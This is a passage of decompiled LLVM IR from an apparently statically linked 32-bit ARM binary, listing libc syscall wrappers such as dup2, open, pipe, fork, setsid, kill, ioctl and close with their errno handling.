dec_label_pc_13e54:                               ; preds = %bb1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_13e54, %bb1
  %v0_13e6c = call i32 @__syscall_error()
  ret i32 %v0_13e6c
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13e70 = load i32, i32* @r7, align 4
  store i32 %v3_13e70, i32* %stack_var_-8, align 4
  %v0_13e7c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13e7c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13e7c, -4095
  br i1 %tmp, label %dec_label_pc_13e9c, label %dec_label_pc_13e8c

dec_label_pc_13e8c:                               ; preds = %entry
  %v0_13e8c = call i32 @__GI___errno_location()
  %v0_13e90 = load i32, i32* %r7.global-to-local, align 4
  %v1_13e90 = sub i32 0, %v0_13e90
  %v2_13e94 = inttoptr i32 %v0_13e8c to i32*
  store i32 %v1_13e90, i32* %v2_13e94, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13e9c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13e9c

dec_label_pc_13e9c:                               ; preds = %entry, %dec_label_pc_13e8c
  %v1_13ea0 = phi i32 [ %v0_13e7c, %entry ], [ -1, %dec_label_pc_13e8c ]
  %v2_13e9c = phi i32 [ %v3_13e70, %entry ], [ %v2_13e9c.pre, %dec_label_pc_13e8c ]
  store i32 %v2_13e9c, i32* @r7, align 4
  ret i32 %v1_13ea0

; uselistorder directives
  uselistorder i32 %v0_13e7c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13e9c, { 1, 0 }
}

define i32 @__GI_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_13ea4 = load i32, i32* @r2, align 4
  %v9_13ea4 = load i32, i32* @r3, align 4
  store i32 %v9_13ea4, i32* %stack_var_-4, align 4
  %v1_13eb4 = and i32 %arg2, 64
  %v2_13eb4 = icmp eq i32 %v1_13eb4, 0
  br i1 %v2_13eb4, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v3_13ebc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_13ebc, i32* @r3, align 4
  %phitmp = urem i32 %v6_13ea4, 65536
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_13ec0 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_13ec0, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13ef0, label %dec_label_pc_13ee0

dec_label_pc_13ee0:                               ; preds = %.thread
  %v0_13ee0 = call i32 @__GI___errno_location()
  %v0_13ee4 = load i32, i32* %r7.global-to-local, align 4
  %v1_13ee4 = sub i32 0, %v0_13ee4
  store i32 %v1_13ee4, i32* @r3, align 4
  %v2_13ee8 = inttoptr i32 %v0_13ee0 to i32*
  store i32 %v1_13ee4, i32* %v2_13ee8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13ef0

dec_label_pc_13ef0:                               ; preds = %.thread, %dec_label_pc_13ee0
  %v0_13ef0 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_13ee0 ]
  ret i32 %v0_13ef0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ef0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f04 = load i32, i32* @r7, align 4
  store i32 %v3_13f04, i32* %stack_var_-8, align 4
  %v0_13f10 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13f10, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13f10, -4095
  br i1 %tmp, label %dec_label_pc_13f30, label %dec_label_pc_13f20

dec_label_pc_13f20:                               ; preds = %entry
  %v0_13f20 = call i32 @__GI___errno_location()
  %v0_13f24 = load i32, i32* %r7.global-to-local, align 4
  %v1_13f24 = sub i32 0, %v0_13f24
  %v2_13f28 = inttoptr i32 %v0_13f20 to i32*
  store i32 %v1_13f24, i32* %v2_13f28, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13f30.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13f30

dec_label_pc_13f30:                               ; preds = %entry, %dec_label_pc_13f20
  %v1_13f34 = phi i32 [ %v0_13f10, %entry ], [ -1, %dec_label_pc_13f20 ]
  %v2_13f30 = phi i32 [ %v3_13f04, %entry ], [ %v2_13f30.pre, %dec_label_pc_13f20 ]
  store i32 %v2_13f30, i32* @r7, align 4
  ret i32 %v1_13f34

; uselistorder directives
  uselistorder i32 %v0_13f10, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13f30, { 1, 0 }
}

define i32 @__GI_getpid() local_unnamed_addr {
entry:
  %v1_13f48 = load i32, i32* @r0, align 4
  ret i32 %v1_13f48
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_13f50 = ptrtoint i32* %stack_var_-16 to i32
  %v2_13f60 = call i32 @gettimeofday(i32 %v2_13f50, i32 0)
  %v2_13f64 = load i32, i32* %stack_var_-16, align 4
  %v2_13f68 = icmp eq i32* %arg1, null
  br i1 %v2_13f68, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_13f64, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_13f64

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13fb0, label %dec_label_pc_13fa0

dec_label_pc_13fa0:                               ; preds = %entry
  %v0_13fa0 = call i32 @__GI___errno_location()
  %v0_13fa4 = load i32, i32* %r4.global-to-local, align 4
  %v1_13fa4 = sub i32 0, %v0_13fa4
  %v2_13fa8 = inttoptr i32 %v0_13fa0 to i32*
  store i32 %v1_13fa4, i32* %v2_13fa8, align 4
  br label %dec_label_pc_13fb0

dec_label_pc_13fb0:                               ; preds = %entry, %dec_label_pc_13fa0
  %v1_13fb8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_13fa0 ]
  ret i32 %v1_13fb8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13fb0, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_13fcc = load i32, i32* @r0, align 4
  ret i32 %v1_13fcc
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13fd0 = load i32, i32* @r7, align 4
  store i32 %v3_13fd0, i32* %stack_var_-8, align 4
  %v0_13fdc = load i32, i32* @r0, align 4
  store i32 %v0_13fdc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13fdc, -4095
  br i1 %tmp, label %dec_label_pc_13ffc, label %dec_label_pc_13fec

dec_label_pc_13fec:                               ; preds = %entry
  %v0_13fec = call i32 @__GI___errno_location()
  %v0_13ff0 = load i32, i32* %r7.global-to-local, align 4
  %v1_13ff0 = sub i32 0, %v0_13ff0
  %v2_13ff4 = inttoptr i32 %v0_13fec to i32*
  store i32 %v1_13ff0, i32* %v2_13ff4, align 4
  %v2_13ffc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13ffc

dec_label_pc_13ffc:                               ; preds = %entry, %dec_label_pc_13fec
  %v1_14000 = phi i32 [ %v0_13fdc, %entry ], [ -1, %dec_label_pc_13fec ]
  %v2_13ffc = phi i32 [ %v3_13fd0, %entry ], [ %v2_13ffc.pre, %dec_label_pc_13fec ]
  store i32 %v2_13ffc, i32* @r7, align 4
  ret i32 %v1_14000

; uselistorder directives
  uselistorder i32 %v0_13fdc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ffc, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_14010 = load i32, i32* @r0, align 4
  %v1_14010 = load i32, i32* @r1, align 4
  %v2_14010 = call i32 @wait4(i32 %v0_14010, i32 %v1_14010)
  ret i32 %v2_14010
}

define i32 @access(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14020 = load i32, i32* @r7, align 4
  store i32 %v3_14020, i32* %stack_var_-8, align 4
  %v0_1402c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1402c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1402c, -4095
  br i1 %tmp, label %dec_label_pc_1404c, label %dec_label_pc_1403c

dec_label_pc_1403c:                               ; preds = %entry
  %v0_1403c = call i32 @__GI___errno_location()
  %v0_14040 = load i32, i32* %r7.global-to-local, align 4
  %v1_14040 = sub i32 0, %v0_14040
  %v2_14044 = inttoptr i32 %v0_1403c to i32*
  store i32 %v1_14040, i32* %v2_14044, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1404c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1404c

dec_label_pc_1404c:                               ; preds = %entry, %dec_label_pc_1403c
  %v1_14050 = phi i32 [ %v0_1402c, %entry ], [ -1, %dec_label_pc_1403c ]
  %v2_1404c = phi i32 [ %v3_14020, %entry ], [ %v2_1404c.pre, %dec_label_pc_1403c ]
  store i32 %v2_1404c, i32* @r7, align 4
  ret i32 %v1_14050

; uselistorder directives
  uselistorder i32 %v0_1402c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1404c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14084, label %dec_label_pc_14074

dec_label_pc_14074:                               ; preds = %entry
  %v0_14074 = call i32 @__GI___errno_location()
  %v0_14078 = load i32, i32* %r4.global-to-local, align 4
  %v1_14078 = sub i32 0, %v0_14078
  %v2_1407c = inttoptr i32 %v0_14074 to i32*
  store i32 %v1_14078, i32* %v2_1407c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14084

dec_label_pc_14084:                               ; preds = %entry, %dec_label_pc_14074
  %v0_14084 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14074 ]
  ret i32 %v0_14084

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14084, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14094 = load i32, i32* @r7, align 4
  store i32 %v3_14094, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_140bc, label %dec_label_pc_140ac

dec_label_pc_140ac:                               ; preds = %entry
  %v0_140ac = call i32 @__GI___errno_location()
  %v0_140b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_140b0 = sub i32 0, %v0_140b0
  %v2_140b4 = inttoptr i32 %v0_140ac to i32*
  store i32 %v1_140b0, i32* %v2_140b4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_140c0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_140bc

dec_label_pc_140bc:                               ; preds = %entry, %dec_label_pc_140ac
  %v2_140c0 = phi i32 [ %v3_14094, %entry ], [ %v2_140c0.pre, %dec_label_pc_140ac ]
  %v0_140bc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_140ac ]
  store i32 %v2_140c0, i32* @r7, align 4
  ret i32 %v0_140bc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_140bc, { 1, 0 }
}

define i32 @__GI_read(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_140c8 = load i32, i32* @r7, align 4
  store i32 %v3_140c8, i32* %stack_var_-8, align 4
  %v0_140d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_140d4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_140d4, -4095
  br i1 %tmp, label %dec_label_pc_140f4, label %dec_label_pc_140e4

dec_label_pc_140e4:                               ; preds = %entry
  %v0_140e4 = call i32 @__GI___errno_location()
  %v0_140e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_140e8 = sub i32 0, %v0_140e8
  %v2_140ec = inttoptr i32 %v0_140e4 to i32*
  store i32 %v1_140e8, i32* %v2_140ec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_140f4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_140f4

dec_label_pc_140f4:                               ; preds = %entry, %dec_label_pc_140e4
  %v1_140f8 = phi i32 [ %v0_140d4, %entry ], [ -1, %dec_label_pc_140e4 ]
  %v2_140f4 = phi i32 [ %v3_140c8, %entry ], [ %v2_140f4.pre, %dec_label_pc_140e4 ]
  store i32 %v2_140f4, i32* @r7, align 4
  ret i32 %v1_140f8

; uselistorder directives
  uselistorder i32 %v0_140d4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140f4, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_14100 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1410c = call i32 @getrlimit(i32 7, i32 %v2_14100)
  %v1_14110 = icmp slt i32 %v2_1410c, 0
  %v5_14114 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_14110, i32 256, i32 %v5_14114
  ret i32 %storemerge
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14128 = load i32, i32* @r7, align 4
  store i32 %v3_14128, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14150, label %dec_label_pc_14140

dec_label_pc_14140:                               ; preds = %entry
  %v0_14140 = call i32 @__GI___errno_location()
  %v0_14144 = load i32, i32* %r7.global-to-local, align 4
  %v1_14144 = sub i32 0, %v0_14144
  %v2_14148 = inttoptr i32 %v0_14140 to i32*
  store i32 %v1_14144, i32* %v2_14148, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_14154.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14150

dec_label_pc_14150:                               ; preds = %entry, %dec_label_pc_14140
  %v2_14154 = phi i32 [ %v3_14128, %entry ], [ %v2_14154.pre, %dec_label_pc_14140 ]
  %v0_14150 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14140 ]
  store i32 %v2_14154, i32* @r7, align 4
  ret i32 %v0_14150

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14150, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1415c = load i32, i32* @r7, align 4
  store i32 %v3_1415c, i32* %stack_var_-8, align 4
  %v0_14168 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14168, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14168, -4095
  br i1 %tmp, label %dec_label_pc_14188, label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %entry
  %v0_14178 = call i32 @__GI___errno_location()
  %v0_1417c = load i32, i32* %r7.global-to-local, align 4
  %v1_1417c = sub i32 0, %v0_1417c
  %v2_14180 = inttoptr i32 %v0_14178 to i32*
  store i32 %v1_1417c, i32* %v2_14180, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14188.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14188

dec_label_pc_14188:                               ; preds = %entry, %dec_label_pc_14178
  %v1_1418c = phi i32 [ %v0_14168, %entry ], [ -1, %dec_label_pc_14178 ]
  %v2_14188 = phi i32 [ %v3_1415c, %entry ], [ %v2_14188.pre, %dec_label_pc_14178 ]
  store i32 %v2_14188, i32* @r7, align 4
  ret i32 %v1_1418c

; uselistorder directives
  uselistorder i32 %v0_14168, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14188, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_141cc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_141cc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_141cc, -4095
  br i1 %tmp, label %dec_label_pc_141ec, label %dec_label_pc_141dc

dec_label_pc_141dc:                               ; preds = %entry
  %v0_141dc = call i32 @__GI___errno_location()
  %v0_141e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_141e0 = sub i32 0, %v0_141e0
  %v2_141e4 = inttoptr i32 %v0_141dc to i32*
  store i32 %v1_141e0, i32* %v2_141e4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_141ec

dec_label_pc_141ec:                               ; preds = %entry, %dec_label_pc_141dc
  %v1_141f8 = phi i32 [ %v0_141cc, %entry ], [ -1, %dec_label_pc_141dc ]
  ret i32 %v1_141f8

; uselistorder directives
  uselistorder i32 %v0_141cc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_141ec, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_14238 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14238, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14238, -4095
  br i1 %tmp, label %dec_label_pc_14258, label %dec_label_pc_14248

dec_label_pc_14248:                               ; preds = %entry
  %v0_14248 = call i32 @__GI___errno_location()
  %v0_1424c = load i32, i32* %r7.global-to-local, align 4
  %v1_1424c = sub i32 0, %v0_1424c
  %v2_14250 = inttoptr i32 %v0_14248 to i32*
  store i32 %v1_1424c, i32* %v2_14250, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14258

dec_label_pc_14258:                               ; preds = %entry, %dec_label_pc_14248
  %v1_14264 = phi i32 [ %v0_14238, %entry ], [ -1, %dec_label_pc_14248 ]
  ret i32 %v1_14264

; uselistorder directives
  uselistorder i32 %v0_14238, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14258, { 1, 0 }
}

define i32 @__GI_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14268 = load i32, i32* @r7, align 4
  store i32 %v3_14268, i32* %stack_var_-8, align 4
  %v0_14274 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14274, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14274, -4095
  br i1 %tmp, label %dec_label_pc_14294, label %dec_label_pc_14284

dec_label_pc_14284:                               ; preds = %entry
  %v0_14284 = call i32 @__GI___errno_location()
  %v0_14288 = load i32, i32* %r7.global-to-local, align 4
  %v1_14288 = sub i32 0, %v0_14288
  %v2_1428c = inttoptr i32 %v0_14284 to i32*
  store i32 %v1_14288, i32* %v2_1428c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14294.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14294

dec_label_pc_14294:                               ; preds = %entry, %dec_label_pc_14284
  %v1_14298 = phi i32 [ %v0_14274, %entry ], [ -1, %dec_label_pc_14284 ]
  %v2_14294 = phi i32 [ %v3_14268, %entry ], [ %v2_14294.pre, %dec_label_pc_14284 ]
  store i32 %v2_14294, i32* @r7, align 4
  ret i32 %v1_14298

; uselistorder directives
  uselistorder i32 %v0_14274, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14294, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1429c = load i32, i32* @r7, align 4
  store i32 %v3_1429c, i32* %stack_var_-8, align 4
  %v0_142a8 = load i32, i32* @r0, align 4
  store i32 %v0_142a8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_142a8, -4095
  br i1 %tmp, label %dec_label_pc_142c8, label %dec_label_pc_142b8

dec_label_pc_142b8:                               ; preds = %entry
  %v0_142b8 = call i32 @__GI___errno_location()
  %v0_142bc = load i32, i32* %r7.global-to-local, align 4
  %v1_142bc = sub i32 0, %v0_142bc
  %v2_142c0 = inttoptr i32 %v0_142b8 to i32*
  store i32 %v1_142bc, i32* %v2_142c0, align 4
  %v2_142c8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_142c8

dec_label_pc_142c8:                               ; preds = %entry, %dec_label_pc_142b8
  %v1_142cc = phi i32 [ %v0_142a8, %entry ], [ -1, %dec_label_pc_142b8 ]
  %v2_142c8 = phi i32 [ %v3_1429c, %entry ], [ %v2_142c8.pre, %dec_label_pc_142b8 ]
  store i32 %v2_142c8, i32* @r7, align 4
  ret i32 %v1_142cc

; uselistorder directives
  uselistorder i32 %v0_142a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_142c8, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_142d0 = load i32, i32* @r3, align 4
  store i32 %v9_142d0, i32* %stack_var_-4, align 4
  %v2_142dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_142dc, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14310, label %dec_label_pc_14300

dec_label_pc_14300:                               ; preds = %entry
  %v0_14300 = call i32 @__GI___errno_location()
  %v0_14304 = load i32, i32* %r7.global-to-local, align 4
  %v1_14304 = sub i32 0, %v0_14304
  store i32 %v1_14304, i32* @r3, align 4
  %v2_14308 = inttoptr i32 %v0_14300 to i32*
  store i32 %v1_14304, i32* %v2_14308, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14310

dec_label_pc_14310:                               ; preds = %entry, %dec_label_pc_14300
  %v0_14310 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14300 ]
  ret i32 %v0_14310

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14310, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14328.outer

dec_label_pc_14328.outer:                         ; preds = %dec_label_pc_14340, %entry
  %v0_14328.ph = phi i32 [ %v0_14328.pre.pre, %dec_label_pc_14340 ], [ %arg1, %entry ]
  %tmp = icmp ult i32 %v0_14328.ph, -4095
  br label %dec_label_pc_14328

dec_label_pc_14328:                               ; preds = %dec_label_pc_14328.outer, %dec_label_pc_14328
  br i1 %tmp, label %dec_label_pc_14328, label %dec_label_pc_14340

dec_label_pc_14340:                               ; preds = %dec_label_pc_14328
  %v0_14340 = call i32 @__GI___errno_location()
  %v1_14344 = sub i32 0, %v0_14328.ph
  %v2_14348 = inttoptr i32 %v0_14340 to i32*
  store i32 %v1_14344, i32* %v2_14348, align 4
  %v0_14328.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14328.outer

; uselistorder directives
  uselistorder i32 %v0_14328.ph, { 1, 0 }
  uselistorder label %dec_label_pc_14328, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14350 = load i32, i32* @r7, align 4
  store i32 %v3_14350, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1437c, label %dec_label_pc_1436c

dec_label_pc_1436c:                               ; preds = %entry
  %v0_1436c = call i32 @__GI___errno_location()
  %v0_14370 = load i32, i32* %r7.global-to-local, align 4
  %v1_14370 = sub i32 0, %v0_14370
  %v2_14374 = inttoptr i32 %v0_1436c to i32*
  store i32 %v1_14370, i32* %v2_14374, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_14380.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1437c

dec_label_pc_1437c:                               ; preds = %entry, %dec_label_pc_1436c
  %v2_14380 = phi i32 [ %v3_14350, %entry ], [ %v2_14380.pre, %dec_label_pc_1436c ]
  %v0_1437c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1436c ]
  store i32 %v2_14380, i32* @r7, align 4
  ret i32 %v0_1437c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1437c, { 1, 0 }
}

define i32 @__GI_close(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14388 = load i32, i32* @r7, align 4
  store i32 %v3_14388, i32* %stack_var_-8, align 4
  %v0_14394 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14394, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14394, -4095
  br i1 %tmp, label %dec_label_pc_143b4, label %dec_label_pc_143a4

dec_label_pc_143a4:                               ; preds = %entry
  %v0_143a4 = call i32 @__GI___errno_location()
  %v0_143a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_143a8 = sub i32 0, %v0_143a8
  %v2_143ac = inttoptr i32 %v0_143a4 to i32*
  store i32 %v1_143a8, i32* %v2_143ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_143b4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_143b4

dec_label_pc_143b4:                               ; preds = %entry, %dec_label_pc_143a4
  %v1_143b8 = phi i32 [ %v0_14394, %entry ], [ -1, %dec_label_pc_143a4 ]
  %v2_143b4 = phi i32 [ %v3_14388, %entry ], [ %v2_143b4.pre, %dec_label_pc_143a4 ]
  store i32 %v2_143b4, i32* @r7, align 4
  ret i32 %v1_143b8

; uselistorder directives
  uselistorder i32 %v0_14394, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_143b4, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v4_143c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 580) to i32*), align 4
  %v2_143cc = mul i32 %arg1, 2
  %v2_143d0 = add i32 %v4_143c8, %v2_143cc
  %v3_143d0 = inttoptr i32 %v2_143d0 to i16*
  %v4_143d0 = load i16, i16* %v3_143d0, align 2
  %v6_143d0 = zext i16 %v4_143d0 to i32
